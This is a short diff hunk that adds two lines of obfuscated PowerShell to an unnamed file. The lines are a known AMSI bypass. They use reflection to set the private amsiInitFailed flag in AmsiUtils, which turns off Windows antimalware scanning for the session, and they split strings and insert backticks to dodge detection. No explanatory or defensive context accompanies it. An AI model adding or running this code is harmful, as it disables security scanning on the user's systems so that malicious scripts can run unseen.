@@ -1,0 +1,2 @@
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');
+$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
